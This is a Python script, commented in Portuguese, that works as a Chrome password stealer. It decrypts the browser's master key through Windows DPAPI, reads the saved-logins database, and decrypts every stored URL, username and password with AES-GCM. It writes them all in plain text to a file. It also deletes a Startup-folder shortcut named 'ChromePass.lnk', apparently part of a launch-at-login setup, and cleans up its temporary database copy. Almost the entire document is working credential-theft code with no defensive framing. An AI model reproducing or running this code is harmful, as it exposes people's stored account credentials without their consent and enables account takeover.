#Requisitos
#pip install pycryptodome
#pip install pypiwin32
#pip install pywin32
#pip install WxPython 

import shutil
import sys
import os
import json
import base64
import sqlite3
from win32 import win32crypt
from Crypto.Cipher import AES


#Atalho do menu inicializar
lnk_path = os.path.expanduser('~') + r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
lnk = os.path.join(lnk_path, 'ChromePass.lnk')

#Arquivo do banco de dados do chrome
PathLogData = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\default"
FileLogData = os.path.join(PathLogData, 'Login Data')

#Arquivo de criptografia
PathKey = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data"
FileKey = os.path.join(PathKey, 'Local State')

def get_master_key():

    if os.path.exists(FileKey):

        try:
    
            with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
    
        except Exception as e:
    
            sys.exit()

    else:

        sys.exit()
            
    
def decrypt_payload(cipher, payload):
    
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_password(buff, master_key):
    
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    
    except Exception as e:
        
        # print("Provavelmente Chrome versão anterior a V80\n")
        return "Chrome < 80"



if __name__ == '__main__':

    master_key = get_master_key()
    
    if os.path.exists(FileLogData):
        
        login_db = FileLogData
        shutil.copy2(login_db, "Loginvault.db") 
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
   
        try:    
            with open('pwd.txt', 'w') as f:
            
                for r in cursor.fetchall():
                    url = r[0]
                    username = r[1]
                    encrypted_password = r[2]
                    decrypted_password = decrypt_password(encrypted_password, master_key)
                    #print("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
                    f.write("\n" "URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
                
        
        except Exception as e:
            
            cursor.close()
            conn.close()
            f.close()
            sys.exit()
        
        cursor.close()
        conn.close()
        
    else:
        
        print('O arquivo de banco de dados não existe')    
        sys.exit()
    
    try:
        
        if os.path.exists(lnk):
            os.remove(lnk)
            
    except Exception as e:
        
        print('Erro ao apagar ChromePass.lnk', e)
        pass
    
    os.remove("Loginvault.db")
